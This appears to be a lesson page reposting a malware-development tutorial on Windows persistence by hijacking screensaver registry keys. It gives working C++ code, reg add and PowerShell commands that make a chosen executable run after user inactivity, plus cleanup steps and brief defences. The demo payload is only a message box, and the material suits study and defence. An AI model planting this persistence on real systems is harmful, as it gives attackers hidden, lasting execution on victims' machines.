@@ -1,0 +1,160 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Malware development: persistence - part 2. Screensaver hijack.</title><link rel="stylesheet" href="../../content.css"><script src="../../content.js" defer></script></head><body><main class="lesson">
+    <div class="p-4 sm:p-5 my-6 rounded-2xl bg-[var(--accent-soft)] border border-[var(--accent)] text-[#f0f3ff] flex items-start gap-3 shadow-2xl">
+        <i data-lucide="book-marked" class="w-5 h-5 text-[var(--accent)] flex-shrink-0 mt-0.5"></i>
+        <div class="text-xs sm:text-sm leading-relaxed space-y-1">
+            <div class="font-bold text-[var(--accent)] uppercase tracking-wide">MD-MZ Research Field Note #29</div>
+            <div class="text-[#e2e8f0]">Technical research note on <strong class="text-white">Malware development: persistence - part 2. Screensaver hijack.</strong> covering source code implementations, evasion mechanics, and practical attack surface analysis.</div>
+        </div>
+    </div>
+    <p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">C++ example.</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">This post is a second part of a series of articles on windows malware persistence techniques and tricks. Today I’ll wrote about the result of self-researching another persistence trick: Abusing screensavers. screensavers Screensavers are programs that execute after a configurable time of user inactivity. This feature of Windows it is known to be abused by threat actors as a method of persistence. Screensavers are PE-files with a .scr extension by default and settings are stored in the following registry keys: HKEY_CURRENT_USER\Control Panel\Desktop\ScreenSaveActive</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">set to 1 to enable screensaver. HKEY_CURRENT_USER\Control Panel\Desktop\ScreenSaveTimeOut - sets user inactivity timeout before screensaver is executed. HKEY_CURRENT_USER\Control Panel\Desktop\SCRNSAVE.EXE - set the app path to run.</p>
+
+            <div id="practical-example" class="scroll-mt-24 pt-6 pb-2 border-b border-[#212b54] mt-8 mb-4">
+                <h3 class="text-base sm:text-lg font-bold text-white flex items-center gap-2">
+                    <i data-lucide="sparkles" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i>
+                    <span>Practical example</span>
+                </h3>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Let’s go to look at a practical example. Let’s say we have a “malware” from previous part hack.cpp:</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>C / C++ Source</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-c">/*
+meow-meow messagebox
+author: @cocomelonc
+*/
+#include &lt;windows.h&gt;
+int WINAPI WinMain(HINSTANCE hInstance,
+HINSTANCE hPrevInstance, LPSTR lpCmdLine,
+int nCmdShow) {
+MessageBoxA(NULL, "Meow-meow!","=^..^=", MB_OK);
+return 0;
+}</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Let’s go to compile it: x86_64-w64-mingw32-g++ -O2 hack.cpp -o hack.exe \ -mwindows -I/usr/share/mingw-w64/include/ -s \</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">-ffunction-sections -fdata-sections -Wno-write-strings \ -fno-exceptions -fmerge-all-constants \ -static-libstdc++ -static-libgcc -fpermissive</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">And save it to folder Z:\\2022-04-26-malware-pers-2\:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Then, let’s create a script pers.cpp that creates registry keys that will execute our program hack.exe when user inactive 10 seconds:</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>C / C++ Source</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-c">/*
+pers.cpp
+windows low level persistense via screensaver
+author: @cocomelonc
+https://cocomelonc.github.io/tutorial/
+2022/04/26/malware-pers-2.html
+*/
+#include &lt;windows.h&gt;
+#include &lt;string.h&gt;
+int reg_key_compare(HKEY hKeyRoot, char* lpSubKey,
+char* regVal, char* compare) {
+HKEY hKey = nullptr;
+LONG ret;
+char value[1024];
+DWORD size = sizeof(value);
+ret = RegOpenKeyExA(hKeyRoot, lpSubKey, 0, KEY_READ, &amp;hKey);
+if (ret == ERROR_SUCCESS) {
+RegQueryValueExA(hKey, regVal, NULL, NULL,
+(LPBYTE)value, &amp;size);
+if (ret == ERROR_SUCCESS) {
+if (strcmp(value, compare) == 0) {
+
+return TRUE;
+}
+}
+}
+return FALSE;
+}
+int main(int argc, char* argv[]) {
+HKEY hkey = NULL;
+// malicious app
+const char* exe = "Z:\\2022-04-26-malware-pers-2\\hack.exe";
+// timeout
+const char* ts = "10";
+// activation
+const char* aact = "1";
+// startup
+LONG res = RegOpenKeyEx(HKEY_CURRENT_USER,
+(LPCSTR)"Control Panel\\Desktop", 0 , KEY_WRITE, &amp;hkey);
+if (res == ERROR_SUCCESS) {
+// create new registry keys
+RegSetValueEx(hkey, (LPCSTR)"ScreenSaveActive", 0,
+REG_SZ, (unsigned char*)aact, strlen(aact));
+RegSetValueEx(hkey, (LPCSTR)"ScreenSaveTimeOut", 0,
+REG_SZ, (unsigned char*)ts, strlen(ts));
+RegSetValueEx(hkey, (LPCSTR)"SCRNSAVE.EXE", 0,
+REG_SZ, (unsigned char*)exe, strlen(exe));
+RegCloseKey(hkey);
+}
+return 0;
+}
+As you can see, logic is simplest one. We just add new registry keys for timeout and app
+path. Registry keys can be added from the cmd terminal:
+reg add "HKCU\Control Panel\Desktop" /v ScreenSaveTimeOut /d 10
+reg add "HKCU\Control Panel\Desktop" /v SCRNSAVE.EXE \
+/d Z:\2022-04-26-malware-pers-2\hack.exe
+or powershell commands:
+New-ItemProperty -Path 'HKCU:\Control Panel\Desktop\' \
+-Name 'ScreenSaveTimeOut' -Value '10'
+New-ItemProperty -Path 'HKCU:\Control Panel\Desktop\' \
+-Name 'SCRNSAVE.EXE' -Value \
+'Z:\2022-04-26-malware-pers-2\hack.exe'
+but since I love to write code, I wanted to show how to do it with some lines of code.
+
+demo</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Let’s compile our pers.cpp script: x86_64-w64-mingw32-g++ -O2 pers.cpp -o pers.exe \ -I/usr/share/mingw-w64/include/ -s -ffunction-sections \ -fdata-sections -Wno-write-strings -fno-exceptions \ -fmerge-all-constants -static-libstdc++ \ -static-libgcc -fpermissive</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Then, for the purity of experiment, first of all, check registry keys in the victim’s machine and delete keys if exists: reg query "HKCU\Control Panel\Desktop" /s Remove-ItemProperty -Path "HKCU:\Control Panel\Desktop" \ -Name 'ScreenSaveTimeOut' Remove-ItemProperty -Path "HKCU:\Control Panel\Desktop" \ -Name 'SCRNSAVE.EXE'</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Then, run our pers.exe script and check again: .\pers.exe reg query "HKCU\Control Panel\Desktop" /s</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">As you can see, new key added as expected. So now, check everything in action. Logout and login again and wait 10 seconds or just inactive 10 seconds:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Pwn! Everything is worked perfectly :) After the end of the experiment, delete the keys: Remove-ItemProperty -Path "HKCU:\Control Panel\Desktop" \ -Name 'ScreenSaveTimeOut' Remove-ItemProperty -Path "HKCU:\Control Panel\Desktop" \ -Name 'SCRNSAVE.EXE' reg query "HKCU\Control Panel\Desktop" /s</p>
+
+            <div id="conclusion" class="scroll-mt-24 pt-6 pb-2 border-b border-[#212b54] mt-8 mb-4">
+                <h3 class="text-base sm:text-lg font-bold text-white flex items-center gap-2">
+                    <i data-lucide="sparkles" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i>
+                    <span>Conclusion</span>
+                </h3>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">The problem with this persistence trick is that the session is terminated when the user comes back and the system is not idle. However, red teams can perform their operations (something like coin miner) during the user’s absence. If screensavers are disabled by group policy, this method cannot be used for persistence. Also you can block .scr files</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>C / C++ Source</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-c">from being executed from non-standard locations.
+This trick in MITRE ATT&amp;CK
+RegOpenKeyEx
+RegSetValueEx
+RegCloseKey
+Remove-ItemProperty
+reg query
+source code in github</code></pre>
+            </div></main></body></html>
